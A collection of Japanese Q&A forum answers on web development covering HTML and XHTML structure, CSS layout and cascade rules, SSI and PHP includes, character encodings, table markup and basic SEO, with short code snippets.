auto;/*上下をぴったり、左右は真ん中*/ width:880px;/*bodyの幅の指定「ルール1への対応」*/ padding: 0 1em;/*罫線から中身までの空き*/ background: white;/*背景色*/ color: #555;/*文字の色*/ border: solid blue;/*罫の形と色*/ border-width: 0 1px;/*罫の幅、上下が0、左右が1px*/ } body>*{ margin:0;/*bodyの直接の子要素のマージン。本当は望ましくないが、先頭に何が来るのか不明なので*。*/ } </style> </head> <body> <p>中身をいろいろ入れてください。縦に中身が広がると罫も延びるのがわかると思います。</p> </body> </html>
　ページ数にもよりますが、ファイルを開かずに置換できる高機能なテキストエディタでしたら苦もなく出来るのですが・・・。 　また、サーバーサイドで行うもっとも簡単なのはＳＳＩを使用する方法です。該当部分に <div class="nav" id="sitemap"> <!--#include virtual="/menue.txt" --> </div> とかでよいです。 ☆最近はSSIが利用できないレンタルサーバーもあるので確認すること ☆HTMLファイルの拡張子は.shtmlですが、.htaccessの設定で.htmlをSSIとして動作させることも可能 またPHPが利用できるサーバーでしたら <?php include("/menue.txt"); ?> とか・・ .html拡張子で動作させたいなら同様です。 　また、すべてのページをサーバーサイドで動的に作成する方法もあります。ごく簡単な例としてすべてのデータを/dataにでもおいておいて、/にはindex.cgiをDIRECTORY_INDEXの最初に指定しておく。これで、たとえば/product/abc/efg.htmlが要求されると、/product/abc/efg.htmlは、環境変数PATH_INFOに格納された上で、index.cgiが動作し、/data/product/abc/efg.htmlを読み込みそのままサイトマップを追記して返すとか・・・ いずれの方法でも、HTMLソースにはincludeは現れませんし、javascriptを使用しませんのでSEO的にも問題ないでしょう。 　それぞれの方法は調べてください。
方法はありません。 ビデオを再生するために必ずアプリケーションはローカルに保存しなければなりません。 一旦ユーザーのパソコンに保存されたデータを外部から削除することはできません。また削除するソフトをインストールさせることは通常ならできません。 　いわゆるウィルスはそれを行いますが・・・ 　あなたが求められている技術はウィルスの動作そのものなのです。それをお望みでしたら他の方法で探してください。(ネット上にあると聞いています。) 　あくまでウェブに公開するものは、そのような情報は適していません。たとえCDで配布しても同様です。 　方法としては、キャッシュに残っていても再生には動的なパスワードが必要な方法です。これも抜け道がありますが、とりあえずは防げるでしょう。 　⇒Microsoft Windows Media - デジタル著作権管理 (DRM)( http://www.microsoft.com/japan/windows/windowsme … ) ・再生しながら録画するソフトがあります。 ・DRMを解除するツールも存在します。 　
　?以降はQUERY_STRINGSです。それであるかないかは別にして、拡張子を含めて何でも構いません。 　それとは別に、ウェブでは拡張子が.txtであってもtext/htmlとしてHTMLを提供できます。 サーバーからの応答ヘッダが、mime-type:text/html ・・・ 　拡張子が問題になるのはWindowsと言うお馬鹿なOS上で、自身の持つファイルを使用するときだけです。Windowsはレジストリと言って便利だけどおせっかいな仕組みがあるので・・他のOSは使用する都度選択したり、ディレクトリ(フォルダ)単位で指定したり出来ます。 　なお、こちらはQuery_StringではなくPATH_INFOで渡しています。 http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/nsrvb … ＞ホームページってhtmlで終わるわけではないのですか？ 　Windows上で、HTMLファイルを扱うときにレジストリに登録してある拡張子が一般的にはhtmlやhtmだということです。他のOSではあまり関係ありません。 　もちろんウェブ上のURLはファイル自体を示しているわけではありません。単なるURLと言う以上の意味ははありません。
form ===src="mailto:***"、href="mailto:****は、あくまでブラウザのおまけ機能です。 　⇒href = uri [CT]( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　他のOS,ブラウザ,言語などを使われている方には意味ありません。URLエンコードだけでは対処できないことが多いです。 <form>を使って送信するほうが確実です。 　 　
アンカーを記述します。 たとえば、 <a href="http: //*******.html#A5">私の回答</a> というふうに、 　その部分のHTMLソースを調べてidないし、a要素にname属性が設定してあればよいです。
「HTMLで「：」の文字の位置を各項目統一して表示したいのですが」 　枠線のないテーブルを作り、項目と「：」を別のセルにする。 ＜ＴＡＢＬＥ＞ ＜ＴＲ＞＜ＴＤ＞名前＜ＴＤ＞：＜ＴＤ＞（名前） ＜ＴＲ＞＜ＴＤ＞住所＜ＴＤ＞：＜ＴＤ＞（住所） ＜ＴＲ＞＜ＴＤ＞メール＜ＴＤ＞：＜ＴＤ＞（メール） ＜ＴＲ＞＜ＴＤ＞電話番号＜ＴＤ＞：＜ＴＤ＞（電話番号） ＜／ＴＡＢＬＥ＞
さかのぼると、SGMLという軍事目的で定められた規格があります。たとえば、ある軍艦のWordで作成されたマニュアルを数十年経って読もうとしたら、すでにこの世に、当時の古いWordを扱えるコンピューターが無かったら・・。そのために純粋なテキストだけで作成されたデータに、段落や題字を示すタグと、それぞれのタグがどういう意味であるかなどをも規定--「インスタンス・DTD・SGML宣言」--しておけば、何年後でも使えます。 　ただ、SGMLは膨大で複雑なため、簡略化されたXMLが考案され広く使われています。 　一方HTMLは、このSGMLを参考に---ときもりではない---作られたもので、後になってSGMLらしくはなりましたが---、DTDという文書規定とタグ付けされたテキストのセットで利用されるものです。 　一時期、HTMLはHTML4.01を最後にXMLに合わせて書き直された、XHTMLに完全移行する予定でしたが、やはり複雑で受け入れられにくく、結局HTML5として再び歩み始めることになりました。 　XHTML(XMLの文法で書かれたHTML)とHTMLには、いくつか違いがあります。 ・XHTMLは、要素名、属性名は小文字で書くこと ・XHTMLは、属性値は""で囲むこと ・XHTMLは空要素は/>で閉じること 　　空要素とは、タグに括られた内容を持つ得ない要素--IMG,BR,HRなど 　が大きな違いです。この違いはXMLとの比較にもあてはまりますが、XMLはタグを自在に設定できるのが異なります。 <document> 　<midashi>なんたらについて</midashi> 　<p>なんたらかんたら・・・・</p> 　<photo> 　　<path>/images/photo/abc.jpg</path> 　　<data k="date">2112.12.01</data> ・・・とか。 　ブラウザで表示するためには、別途スタイルシート(XSLT)が必要ですが・・ 　⇒XML画像データををHTMLで簡単に表示する方法 - HTML - 教えて！goo( http://oshiete.goo.ne.jp/qa/7779854.html ) 　⇒XSL変換したが画像が表示できません - HTML - 教えて！goo( http://oshiete.goo.ne.jp/qa/7782480.html ) 　XMLとHTMLの関係は、上記を見れば分かるでしょう。 　なお、次期バージョンのHTML5には、XML(XHTML)として記述する方法もあります。 　⇒Polyglot マークアップ: HTML 互換の XHTML 文書( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) [HTML4あたり] ・HTMLとXHTMLは異なる。一方に従えば一方ではエラー ・XHTMLはHTMLをXML文法であらわしたもの ・XMLはHTMLのみならず、様々なものに使われる。最新のwordやexcelのファイルはXMLです。 [HTML5] ・HTMLであってもXML的な書き方が出来る。エラーにならない ・mathMLやSVGのようなXML要素をそのまま埋め込むことができる。
初心者でしたら、単純にたくさんページを用意してリンクしていくほうが良いでしょう。 　javascriptが得意でしたら、javascriptで作ればよいと思います。onClickで、formの内容を拾って、DocumentWriteで新たに書き出せばよいです。私は面倒くさいので、CGIで行いますが、javascriptでしたらサーバーとの交信がありませんからスムーズでしょう。 　それなら、いっそのことJQueryを使うと良いでしょう。 　⇒jQueryによるフォームのデザインの基礎( http://ascii.jp/elem/000/000/452/452106/ ) 　javascriptが苦手でしたらiframeを使っても良いでしょう。また、単純にHTML+CSSでも良いです。
本当に答えて欲しいのなら ブラウザ環境と、どのようなエラーが出るかと、短いのならソース全部と、どうなって欲しいのかをきちんと書いてください
そんな多分に便宜上の妥協が入っている（単に素人がやったからと言うだけかもしれませんが）カテゴライズなんか何の参考にもならないでしょうに。 Microsoft ASP/CGI/Webデザイン・CSS/Flash/HTML/XML/AJAXはプログラミング言語じゃないです。 CGIとかはコンピュータ言語でさえないですね。
　tableは、二次元以上のデータを並べる方法ですから、可能な限り小さく表示する描画手段をとることが推奨されています。 　⇒11.3.2 水平及び垂直方向の配置( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 男　　　　　　　　　　　　　　　　　　　　│５００人 女　　　　　　　　　　　　　　　　　　　　｜２００人 　もし1900pz程度の幅広のディスプレイじゃ利用しづらくてたまりません。 　内容の幅に合わせて可能な限り小さく表示するのじゃまずいのですか？ なお、tableにはsumarry属性か必須(HTML4～XHTML1.1)です。また<tbody>がひとつ以上は要ります。 <table summary="なんたらの表" border="1"> 　<tbody> 　　<tr> 　　　<th abbr="性別"></th><th abbr="人数"> 　　</tr> 　　　<td>男</td><td>500人</td> とかになります。 　border属性を書くのは検索エンジンに表であることを伝えるためと後方互換です。 cellspacing=0 cellpadding=0　は非推奨です。
デザインのためにHTMLを書くのではない!!! 　これだけはしっかり覚えて置いてください。HTML4.01が勧告された1999年以前から言われ続けてきたのですが、 　⇒構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　⇒単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　⇒ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　まず、その画像の説明がどのような文書構造なのかを決めてHTML(小文字じゃない)をマークアップしてください。 [例] たくさん画像があってその説明があるリスト 　<ul> 　　<li><img src="" width="" height="" alt=""> 　　　<p>短い説明</p> 　　</li> 　　<li><img src="" width="" height="" alt=""> 　　　<p>短い説明</p> 　　</li> 　・・・【中略】・・・ 　</ul> [例] 　文章中に挿絵として画像がある。 　<div class="figure"> 　　<img src="" width="" height="" alt=""> 　　<p class="caption">説明</p> 　</div> 　<p>本文記事・・figureはHTML5から導入される新しい要素で挿絵(画像に限らない)をマークアップする。HTML4.01ではclass名で挿絵であることを示す</p> [商品リスト] <div class="productList"> 　<ul> 　　<li>商品名 　　　<ol> 　　　　<li>価格</li> 　　　　<li>商品説明</li> 　　　　<li>在庫</li> 　　</li> 　　<li>商品名 　　　<ol> 　　　　<li>価格</li> 　　　　<li>商品説明</li> 　　　　<li>在庫</li> 　　</li> ・・・【中略】・・・ どのようなHTMLであってもきちんとマークアップされていればスタイルシートで自由自在にデザインできますし、先でデザインを変えることもできます。 　まず、HTMLを作成してください。
文字コードとしては Shift_JIS が正式名称ですが、IANA では MS_Kanji, csShiftJIS がエイリアス(別名)として定義されています。 http://www.iana.org/assignments/character-sets/c … 一方、IE では Shift_JIS が正式名称な点は同じですが、csShiftJIS, csWindows31J, ms_Kanji, shift-jis, x-ms-cp932, x-sjis がエイリアスとして定義されています。 http://msdn.microsoft.com/en-us/library/ms537500 … RFC2130 では "x-" で始まる文字コードを実験的な名称として定義しています。 --- quoted from RFC2130 http://www.ietf.org/rfc/rfc2130.txt H: The current use of the "x-*" format for distinguishing experimental tags should be continued for private use among consenting parties. All other namespaces should be allocated by IANA. --- Netscape Navigator 2.0 が x-sjis を普及させ、後に Shift_JIS として標準化された経緯があって Shift_JIS と x-sjis が混在されたようです。 IE はどちらも認識しますが、今となっては後方互換性を気にして x-sjis を使用する意味はないと思われます。 そもそも、IANA で x-sjis がエイリアスとして登録されていない時点で最近のブラウザでサポートする保障がありません。 正式名称である Shift_JIS を使用することをお勧めします。
　cssで作った箱を並べた時に出来る隙間 ( http://oshiete.goo.ne.jp/qa/7851489.html )の続きですね。 　その前に、もっともっと大事なことがあります。スタイルシートでプレゼンテーション(表現)を指定するということは、HTMLでは文書構造をマークアップするということと組み合わせて成り立つのです。 　従来はHTMLの貧弱なプレゼンテーションを利用してプレゼンテーションを行ってきたため、肝心要のHTMが文書構造を示せなくなったことからの反省です。 　→2.3.5 スタイルシート ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　→2.4.1 構造とプレゼンテーションの分離 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　→スタイルシートの概説 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　これらは必ず読んでおくこと。その上で・・ 　「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」を読むと、tyuuou,main-box,side-boxというclass名はおかしいことが理解できると思います。特にDOCTYPEを<!DOCTYPE html>と書かれていることはHTML5を意識されているようですが、それならなおさらです。なぜならHTML5は「HTML4.01をより文書構造化する」が一つの重要な改善点だからです。 HTML５では、基本的に <body> 　<header> 　　文書のヘッダ 　</header> 　<section> 　　本文 　　<div class="contentTable"> 　　　本文の目次が入るなら 　　</div> 　</section> 　<footer> 　</footer> </body> になります。HTML5の新しい要素に対応していないブラウザがたくさんある現状ではHTML4.01で <body> 　<div class="header"> 　　文書のヘッダ 　</div> 　<div class="section"> 　　本文 　　<div class="contentTable"> 　　　本文の目次が入るなら 　　</div> 　</div> 　<div class="footer"> 　</div> </body> となるはずです。 　・・・前置きが長くなりましたが、ここまでは今から学び始める上にとっても重要ですからしっかり理解してください。 　HTMLは、スタイルシートでデザインを指定する前にしっかり作りこんでいく必要があります。たぶん、あなた自身にはどこに何を配置しようかと言うイメージがあるはずです。それを頭において、デザインは無視してHTMLを作成すること。あなたのイメージは文書の内容や構造から来る必然でもあるからです。 　そのうえで、内容をセンター配置したければ、スタイルシートは html,body{margin:0;padding:0;}/* ウインドウとの隙間を消しておく */ div.header,div.section,div.footer{ width:100%; /* ディスプレイの巾いっぱい */ min-width:640px; /* ディスプレイが小さいときは640pxまでは付き合う */ max-width:980px; /* 広いときは980px(paddingを含めると1000px まで */ margin:0 auto;/* 常に中央に配置 */ border:solid 1px gray; padding:10px; } div.header{min-height:200px;background-color:rgb(255,200,200);} div.section{min-height:400px;background-color:rgb(255,255,200);position:relative;} div.footer{min-height:100px;background-color:rgb(200,255,200)} div.section div.contentTable{ /* section内のcontentTable */ position:absolute; top:0;left:0; width:20%;height:100%; } などのように、右じゃなく左に置きたければ、right:0;ですね。
スタイルを記述する場所は a)要素のstyle属性に記述する b)HTMLの<head></head>内に記述する 　HTML5ではscoped属性を用いてフローコンテンツ内にも書ける。 c)外部スタイルシート 　@importする場合も の３箇所です。 <head></head>内のどこに書いても良いです。 どのスタイルシートが適用されるかは、 出所 ・ブラウザの持つスタイルシート ・著者指定のスタイルシート ・ユーザー指定のスタイルシート および最重要宣言 　ユーザーの最重要宣言されたスタイル＞著者の最重要宣言されたスタイル＞著者のスタイル＞ユーザーのスタイル＞ブラウザのスタイル 　でどれを優先するか決まります。 　その上で、HTMLの要素に適用されうる指定を探しますが、それを見つけると詳細度でソートしもっとも詳細度が高いものが指定されます。同じ詳細度があれば登場順に上書きされます。style属性にかかれたものは、他の指定の詳細度をゼロとして、その指定の詳細度を1,0,0,0として適用されます。 詳しくは 5. セレクタ ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 6. 値の割り当て、カスケード処理、継承 ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　にあります。(この邦訳はCSS2のもので、現在Web標準のCSS2.1のものではありませんが、詳細度の計算を除き大きな違いはないでしょう。) ★これは以降のプロパティの説明より前に書かれていることから解るように、カスケーディングスタイルシートの根幹にもなる重要な部分です。 table {border-collapse: collapse;} 　なんかより、先にしっかり身につけておかないとなりません。そうしないと無駄で煩雑でメンテナンス不能なスタイルシートを書いてしまう羽目になります。 なお、細かいですが 「html文に」じゃなくてHTML(頭文字による略語ですから大文字)です。 また、<body>のように小文字で書くほうが何かと良いでしょう。HTML構文ではどちらも使えますが、XHTMLでは、要素名、属性は必ず小文字です。
スタイルシートの画像を置き換えるのではなく、HTMLのlang属性を書き換えるほうが楽です。 <html lang="en-us"> 　などでデフォルトの言語はen-で始まるものにされていると思います。 　HTMLのナビゲーションリストが <div class="nav"> 　<ol> 　　<li><a href="/" lang="en-us">Top</a></li> 　　<li><a href="/products" lang="en-us">products</a></li> 　　<li><a href="/ContuatUs" lang="en-us">ContuatUs</a></li> 　</ol> </div> とかだと思います。 　スタイルシートは、 div.nav ol li a{overflow:hidden;width:6em;} div.nav ol li a[href="/"][lang|=en]{background:url() 0 0;} div.nav ol li a[href="/"][lang|=en]:hover{background:url() 0 100px;} div.nav ol li a[href="/"][lang|=en]:active{background:url() 0 200px;} div.nav ol li a[="/"][lang="ja"]{background:url([日本語画像]) 0 0;} div.nav ol li a[href="/"][lang="ja"]:hover{background:url([日本語画像]) 0 100px;} div.nav ol li a[href="/"][lang="ja"]:active{background:url([日本語画像]) 0 200px;} とかだと、javascriptで該当要素にlang="ja"を追加するだけで背景画像は切り替わるはずです。 　要素セレクタを使ってスタイルシートを書いておけば、lang属性に関わらず、class属性でも何でも良いですし、HTMLも弄らなくてすむ。
floatの場合は、メインからmargin-rightを指定 外枠に幅があるなら、その分の幅をマイナスしておく .main-box { margin-right: 10px; }
意味が不明なのですが ＞テキストエリアにある文字列をボタンを押すと 　テキストエリアにはボタンは無いです。 　テキストエリアは、文字を入力するためのコントロールですから、推測するに「テキストエリアに入力して、ボタンを押すと用意したpreタグ内に入力した文字が表示される」と言うことですか？ 　通常は、シンタックハイライトしたい文字列を正規表現で補足して、その前後を<span class="function"></span>などで囲み、ハイライトはスタイルシートに任せるのが楽だと思います。 　
すみませんIE9のリンク先まちがえました・・・ IE9 & Windows 7 Ultimate SP1 x64 http://www27.atpages.jp/stepmaniasongs/xbrowse/i …
まず、DIVの用途ですが、 「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 です。また、HTML5では、ノートで「Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. Use of the div element instead of more appropriate elements leads to poor accessibility for readers and poor maintainability for authors. ( http://www.w3.org/TR/2011/WD-html5-20110525/grou … )」 　翻訳すると「・・・著者は、他に適切な要素がないときなど、最後の手段の要素としてdiv 要素を使用することが強く推奨されます。より適切な要素があるのに div 要素を使うと、・・・【中略】・・・、著者にとってもメンテナンス性が落ちてしまいます。」 　何でもかんでもDIVを使用するのは間違いです。DIVを使用するのは ・複数の要素がグループとしてそれがその文書にとってのブロックであるとき ・他に適切な要素が無いとき 　そして、使用するときはclassなどをつけて文書構造を補完する必要があります。 　HTML4には、文書構造を使用する要素がないためclass名を使いますがHTML5ではそれが挿絵でしたら <figure> 　<img src="cat.jpg" width="168" height="135" alt="オスの三毛猫"> 　<figcaption>うちの猫です！</figcaption> </figure> のようになるはずですし、HTML4でしたら <div class="figure"> 　<img src="cat.jpg" width="168" height="135" alt="オスの三毛猫"> 　<p>うちの猫です！</p> </div> でしょう。 あるいは、 <div class="figure"> 　<p class="photo"><img src="cat.jpg" width="168" height="135" alt="小柄のオスの三毛猫でよく寝てます。"></p> 　<p class="caption">うちの猫です！</p> </div> とか・・ 　あなたのソースで一番の問題は<br>の使い道です。画像とその説明はひとつの段落ではなく異なる段落ですからp--paragraphでマークアップすべきです。通常は<BR>はHTMLに登場することは無いはずです。 　altには、画像が表示されないユーザーのために画像がなくても伝わる代替テキストを書きます。 →alt ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) →A.1. すべての画像、アプレット、イメージマップに代替テキストをつけましょう。 ( http://www.doraneko.org/wai/contents10/19980918/ … ) ※画像
まず、カテゴリが違うので回答が少ないかと思われます。 デジタルライフ >ソフトウェア >ホームページ作成ソフト まで再度投稿されてはいかがでしょうか？ または、作者WEBサイトであるKaneto’s 不具合＆要望掲示板が そのような質問を受け付けているみたいですので、 そちらでご質問されてみてはいかがでしょうか？ http://www3.rocketbbs.com/731/tkaneto.html
被リンクは大切ですが、それよりかもきちんとSEO(検索エンジン最適化)を 理解して記述していないと、上に表示されるまでが大変です。 重複した名前がなければ比較的上位に表示されやすいですが、 それでもどのようにHTMLを記述されたか分からないと 何ともお答えができないのが現状でしょうか。 一般的な部分についてのみ回答します。 以下の項目はきちんと存在し、情報は埋まっていますか？ <meta name="description" content="" /> <meta name="keywords" content="" /> <title></title> 今から書くのであればHTML5となるかと思われますが、きちんと <header>や<nav>や<article>や<footer>のタグなどで HTMLの構造化を行っていますか？ 背景色と同色のキーワードを紛れ込ませる等のインチキな行為は、 ちゃんと自重してHTMLを記述していますか？ こんなものでは終わりませんがとりあえずはこんなところで。
No.1です。 　大変深刻な状況だということは理解できますが、解決策となると当事者でない、また貴社内の事情を知らない私ではアドバイスは難しいです。 　そのうえで、的外れかもしれませんが。 　まず、あなたの補足にある「最終的には使わないクラスなどが増えてしまい」は重要なキーワードだと思います。また、あなたの分担がどの部分かも想像できます。 　あなた以外へのアドバイスをここでしても始まらないので、対象はあなたになります。 　HTML4.01では、class名について『id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』と書かれています。 　これはあまりに抽象的でW3Cの思いと裏腹に、文書構造を示さないclass名があふれる事態にになりました。いわゆるデザインのためのclass名です。 　その反省から、HTML5では文書構造を示す要素としてheader, section, footer, article, aside, figure, nav, markなどが追加されDIVに関しては、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. Use of the div element instead of more appropriate elements leads to poor accessibility for readers and poor maintainability for authors. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.5 Grouping content — HTML5( http://www.w3.org/TR/2011/WD-html5-20110525/grou … )］より 　・・・著者は、他に適切な要素がないときなど、最後の手段の要素としてdiv 要素を使用することが強く推奨されます。より適切な要素があるのに div 要素を使うと、・・・【中略】・・・、著者にとってもメンテナンス性が落ちてしまいます。 　すなわち、HTML4.01(XHTML1.0,XHTML1.1)であっても、class名にheader, section, footer, article, aside, figure, nav, markくらいで収めてあれば、「最終的には使わないクラスなどが増えてしまい」ということにはならないはずです。 　先の参考サイトのソースは確かそうなっていたはずです。 　また、きちんとした雛形を作成することをお勧めします。通常のサイトでしたら内容的には ・トップページ及び各カテゴリーのトップページ ・企業情報、新着情報、プライバシーポリシーなど事務的なページ ・コンテンツページ ・問合せ、FAQ の数種類に分類されるはずです。 　その分だけ、きちんとマークアップされたHTML(デザインの無い)を雛形として確定することが先決です。その時点でclass名などは固定されます。idはリンクの関係があり流動的です。また、これがないとシステム開発はできないはずです。 　以上は技術的なアドバイスです。 　期待されている(と思われる)作業全体についてのアドバイスは不可能ですが、 　期待が大きすぎて対応し切れていない部分が見受けられます。きちんと自分の可能な作業範囲、厳しい言い方かもしれませんが--能力を示して皆さんの協力を仰ぐのがよいのではないかと思います。ぼろ糞に言われても仕方ないのです。 　それを言われるということは、あなたには成長の見込みがあるからなのです。あなたに期待してなければ、とうにお払い箱です。期待されているからこその要求なのです。 　大事なことは、あなたに限らず、お互いの能力を正確に評価して足りないところを補い合う・・・それしか方策は無いのです。 　頑張ってください。
[[audio]].error.code で再生エラーを拾って別のソースに切り替えてください
確かに日本語はおかしいです。 日本人の体質として、なにかを示す言葉をひとつの専門用語で示そうという性癖があります。 言語と言えば、「コミュニケーションの手段」「なにかを特定する一定の文法」と考えると少しは見えてくるでしょう。 プログラミング言語 　プログラムとは、なにかの「順序・組合せ・筋道・手法」などを示したもので 　この場合は、コンピューターに対してそれらを指示するための言語です。 マークアップ言語 　その文法・定義を定めたスキーマ言語と組み合わせて、言語自体を表すメタ言語となる。 　文書を構成する要素が何であるかを印をつける(マークアップする)言語 CSSは、上の説明からしても、スタイルシートのひとつでマークアップ言語で無いことは理解できると思いますが、プログラム言語かといわれると、そうではありませんね。 どちらでもありません。 　文書のそれぞれの構成要素をどのように表示するかを決めていくプログラムに対しての指示を書いてあるものです。 　その意味では、XSL(拡張可能スタイルシート言語)、特にXSL-FOはプログラムに近いとは言えるでしょう。
Absolute HTML Compressorはどうですか？ バッチ動作、コマンドライン動作、フォルダ単位いずれもＯＫです。 フリーウェアだし、XP/Vista/7で問題なく動きます。 http://www.alentum.com/ahc/
まず、line-height:20pxのように、line-heightをpxで指定してみてください。 ブラウザの違いによる縦の誤差はなくなるはずです。 誤差が生じる原因としてはOSやブラウザの違いから、フォントやレンダリングの違いによるものです。 なので、font-size:14px;に指定していても、line-heightをemや%で相対的に指定している場合は、必ず誤差が生じます。 なお、文字列の横をそろえるのほぼ無理と考えてください。 >pタグに限らず、ul、dlなんかでもずれることが多いです。 こちらに関しては、ブラウザ間のデフォルトの差異をなくすため、リセットCSSがよく使われます。 リセットCSS、reset cssなどで検索してみれば色々出てくるでしょう。 最近はHTML5を考慮しているものもたくさんあるので、そちらを使った方が良いでしょう。 しかし、これも完全に誤差をなくせるというわけではありませんが、一度試してみると良いでしょう。
例えば、 http://search.goo.ne.jp/advanced.jsp の場合なら、 <form action="web.jsp" method="get" name="query"> 受ける側のURIですが、 機能するか？は別問題で、受け付けない場合もあります。 機能するようにCGIを作る必要があります。 各部品は、 <input type="text" name="OT"> <input type="text" name="AT"> <input type="text" name="ET"> <input type="submit" name="web"> それぞれ、type="どんな？" 部品と 各 name="重複しない名" で区別します。 例えば、 ＜調理 action="キッチンで" method="奥様" name="夕食"＞ 　＜電子レンジ type="加熱" name="チン" size="60秒"＞ 　＜電子レンジ type="解凍" name="解かす" size="2分"＞ 何時誰が何をどのように/どうした？みたいな感じの話をHTMLにしているだけ。
結果どうしたいのか不明ですが、 ＞div要素をセンタリング aをセンターリングするのではなく、”div要素”をセンタリングですね？ その例だと、 <td style="padding: 0 100px;"> 等で簡単で済みそうですが・・・ 見た目同じでも、本来のセンターリングの意味にはならないので以下で。 まずは、貴方のHTMLは間違っています。 <div><a href="#"></div> この↑divの中身は一体何でしょう？　ここの質問だけの例だとしても適切に書きましょう。 <div><a href="#">例</a></div> #1の方の回答では、divはセンターリングされません。 div内のインライン要素（文章など）はセンターリングになりますが ブロック要素は、腐ったブラウザを除いてセンターリングされない・・・ divに罫線（枠のborder）を入れると理解できるでしょう。 箱を移動させる？　物を移動させる？　この違いです。どちらかな？ #2の方のは、〆のHTMLが間違かな・・・ divはブロック要素なので、デフォルトでは幅が100％になります。 幅が100％なのだから、右も左もセンターもありません・・・ |｜大大大大大大｜ ← 幅が大きいと移動できない。 |　　　｜小｜　　　　← 幅が小さいと移動できる。 なので、 td内で、divのボックス自体が遊べるように、 tdの幅よりもdivの幅を小さくするのが第一条件です。 次に、 divの左右を margin:auto; にする。 例： <td style="width:200px;"> <div style="width:100px; margin:auto; border:1px solid red;"> <a href="">例</a> </div> </td> これで、中身のインライン要素が左（デフォルトなら）のままで、 divだけがセンターに配置されます。 外部CSSなら（数値は適当） td{ width:200px;} td div{ width:100px; margin:auto;} 因みに、上記ができなければ、 過去モードの可能性があるのでハックなどの別途対応が必要です・・・ <td style="width:200px; text-align:center;"> <div style="width:100px; margin:auto; text-align:left; border:1px solid red;"> <a href="">例</a> </div> </td> あとは応用とか、「CSS センターリング」で検索するとか。
余談失礼いたします。 転送制限の代表的な容量等のご案内です。 各プロバイダ等により転送制限は異なりますが、 メールの総容量を動画ファイルや画像等を含めて10MB未満で作成されれば、 転送制限もクリアできるかと思われます。 動画の直リンクと言う手段もありますが、自動再生は切っておいた方が まだ迷惑にはならないかと＾＾； preload(先読み)なら再生だけで言えば支障はそんなに出ないかと。 メールもVIDEOタグでいけなかったかなぁ・・・ <video controls width="640" height="480"> <source src="ファイル名.mp4"> <source src="ファイル名.webm"> </video>
回答が出ているみたいですので、 回答については控えさせていただきます。 質問者様のサイトを書き直してみました。 以下からダウンロードしてご確認くださいませ。 サイトの幅は独断で800pxに設定し、センタリングしました。 また文書についてもセンタリングしました。 なお、サイトそのものが感染していないとは言い切れませんので、 ダウンロードされた際はウイルス対策ソフト等で ウイルスチェックされるのをお忘れのないよう。 http://www27.atpages.jp/stepmaniasongs/sample.zip
企業サイトなら、クラウドテンプレートのフリー版がいいでしょう。 ここのテンプレートはCSSがキレイで、とても改変しやすいです。 Photoshopデータは含まれていないので、自分はスクリーンショットを撮って、それをベースにPhotoshopで追加部品を作っています。 ここのテンプレートは１本1,980円とお安いので、商用版を買うのもアリです。 http://f-tpl.com/ そこいらのプロが書いたCSSより、何倍も美しいですよ。 「マークアップが第一、ビジュアルは多少小汚くてもいい」ような意見が多くて困ります。
０でも1でも2でも3でも5でも何でも良いので、4以外の好きな値を書けば？ 「1」って書いてあれば「4以外かどうか？」って判定した時に「4じゃない」って判定されるよ。 「4以外」が「4以外」としか考え付かないなら、プログラマには向いてないよ。 「4以外」って言われた時に「1は4以外だから、1で良いや」って言う発想ができる頭じゃないと、プログラムは組めないよ。
どうやらその記事の最初のほうに書いてあることをお忘れのようですね。 一番最初にこう書いてありますよ。 --- 引用開始、一部強調のため””を付加 --- HTML5では、”ローカルな環境での”利用に関する機能が強化されています。その中の目玉とも言えるのが「データベース」関係の機能でしょう。 --- 引用終わり --- つまり、Indexed Database APIで扱っているデータはそのページを見ている方の、ブラウザが管理している部分にあります。 したがって、あらかじめデータを用意しておいてそれを利用するという用途には不向きではないかと思われます。ユーザー入力なしにデータ設定を行うことはできるのですが、ページを利用するすべての人が共有するデータならば、素直にサーバーにデータを置いてそれを必要に応じて検索する方がいいのではないかと。 ではこの機能はどう使えばいいのかというと、「ページを利用するすべての人が共有するデータ」ではない、ユーザーのページ設定などを保管するために使います。 その場合は、設定データ自体がないなら規定値を使って表示すればいいでしょう。 ここでデータ設定を強要したりこっそり規定値を設定しないように。相手はたまたまあなたのページを訪れただけで本格的にあなたのページを利用しようとは思っていないかもしれないのです。データ設定はユーザー登録などを行ったあとでやるべきです。
